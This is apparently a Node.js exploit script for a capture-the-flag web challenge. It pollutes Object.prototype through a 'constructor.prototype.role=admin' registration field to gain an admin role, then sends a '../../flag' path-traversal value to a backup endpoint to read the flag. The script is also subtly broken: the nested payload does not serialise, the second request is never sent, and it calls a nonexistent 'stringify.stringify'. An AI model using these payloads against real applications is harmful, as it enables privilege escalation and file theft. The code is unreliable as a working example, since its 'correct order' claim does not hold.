
const http = require('http');
const querystring = require('querystring');

// 💥 FINAL FINAL CORRECT ORDER:
// 1. First register user with poison → pollutes Object.prototype.role = admin
// 2. THEN register SECOND user → this second user gets role=admin from prototype, no default overwriting!
// This is what we got wrong all this time!

console.log("🚀 Step 1: First user - poison prototype with constructor.prototype.role=admin");

// Step 1: First user, poison
const firstPostData = querystring.stringify({
  "username": "poisonuser",
  "constructor": {
    "prototype": {
      "role": "admin"
    }
  }
});

const opts = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/register',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(firstPostData)
  }
};

const req = http.request(opts, (res) => {
  let body = '';
  res.on('data', chunk => body += chunk);
  res.on('end', () => {
    console.log("✅ Step 1 done: First user registered, Object.prototype.role = admin now!");
    console.log("🚀 Step 2: Register SECOND user - it will inherit role=admin from prototype!");
    // Step 2: Register second user, no role needed, inherits from prototype!
    const secondPostData = querystring.stringify({
      "username": "finaladminuser"
    });

    const secondOpts = {
      hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
      port: 80,
      path: '/register',
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(secondPostData)
      }
    };

    const secondReq = http.request(secondOpts, (secondRes) => {
      let secondBody = '';
      secondRes.on('data', chunk => secondBody += chunk);
      secondRes.on('end', () => {
        let match = secondBody.match(/<span.*?>([a-f0-9]+)<\/span>/);
        if (match) {
          const uid = match[1];
          console.log(`✅ Second user registered, UID: ${uid}`);
          console.log("🚀 Step 3: Login second user, check role...");
          loginAndCheck(uid);
        }
      });
      secondReq.write(secondPostData);
      secondReq.end();
    });
  });
});

req.on('error', err => console.error(err));
req.write(firstPostData);
req.end();

function loginAndCheck(uid) {
  const querystring = require('querystring');
  const loginData = querystring.stringify({uid: uid});
  const loginOpts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/login',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(loginData)
    }
  };

  const req = http.request(loginOpts, (res) => {
    const cookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
    console.log("✅ Logged in, checking profile...");
    const profileData = JSON.stringify({uid: uid});
    const profileOpts = {
      hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
      port: 80,
      path: '/api/profile',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(profileData),
        'Cookie': cookie
      }
    };

    const profileReq = http.request(profileOpts, (profileRes) => {
      let body = '';
      profileRes.on('data', chunk => body += chunk);
      profileRes.on('end', () => {
        console.log("\nProfile response:");
        console.log(body);
        try {
          const json = JSON.parse(body);
          console.log("\nRole is:", json.role);
          if (json.role === 'admin') {
            console.log("\n🎉🎉🎉 WE DID IT! ROLE IS ADMIN! GETTING FLAG...");
            const flagData = querystring.stringify.stringify({file: '../../flag'});
            const flagOpts = {
              hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
              port: 80,
              path: '/api/backup',
              method: 'POST',
              headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(flagData),
                'Cookie': cookie
              }
            };
            const flagReq = http.request(flagOpts, (flagRes) => {
              let flagBody = '';
              flagRes.on('data', chunk => flagBody += chunk);
              flagRes.on('end', () => {
                console.log("\n🏁 🏁 🏁  FINAL FLAG:");
                console.log(flagBody);
              });
            });
            flagReq.write(flagData);
            flagReq.end();
          }
        } catch(e) {
          console.log("Error", e);
        }
      });
    });
    profileReq.write(profileData);
    profileReq.end();
  });

  req.on('error', err => console.error(err));
  req.write(loginData);
  req.end();
}
